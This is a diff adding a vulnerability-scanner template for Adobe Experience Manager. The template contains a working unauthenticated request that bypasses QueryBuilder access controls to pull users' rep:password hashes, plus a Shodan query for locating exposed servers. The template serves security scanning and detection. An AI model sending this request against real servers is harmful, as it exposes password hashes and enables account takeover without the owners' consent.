@@ -1,0 +1,53 @@
+http:
+- extractors:
+  - group: 1
+    internal: true
+    name: password_count
+    part: body
+    regex:
+    - '"results":(\d+)'
+    type: regex
+  - dsl:
+    - '"Found password: " + password_count'
+    type: dsl
+  matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"rep:password"'
+    - '"success":true'
+    - '"results":'
+    - '"hits":'
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'GET /bin/querybuilder.json;x=''x/graphql/execute/json/x''?path=%2Fhome%2Fusers&type=rep%3AUser&p.hits=selective&p.properties=rep%3Apassword&p.limit=3
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: aem-querybuilder-bypass
+info:
+  author: tess,assetnote
+  description: 'Adobe Experience Manager QueryBuilder endpoint allows unauthenticated
+    attackers to extract sensitive user repository data, including password hashes
+    from the rep:password field in /home/users. This vulnerability bypasses access
+    controls and exposes bcrypt/SHA-256 password hashes through the querybuilder.json
+    API, enabling potential credential compromise and account takeover attacks.
+
+    '
+  metadata:
+    max-request: 1
+    shodan-query: http.component:"Adobe Experience Manager"
+    verified: true
+  name: AEM QueryBuilder JSON Exposure - Bypass
+  reference:
+  - https://experienceleague.adobe.com/docs/experience-manager-65/developing/platform/query-builder/querybuilder-api.html
+  - https://slcyber.io/assetnote-security-research-center/finding-critical-bugs-in-adobe-experience-manager/
+  - https://github.com/assetnote/hopgoblin
+  severity: critical
+  tags: aem,adobe,exposure,querybuilder
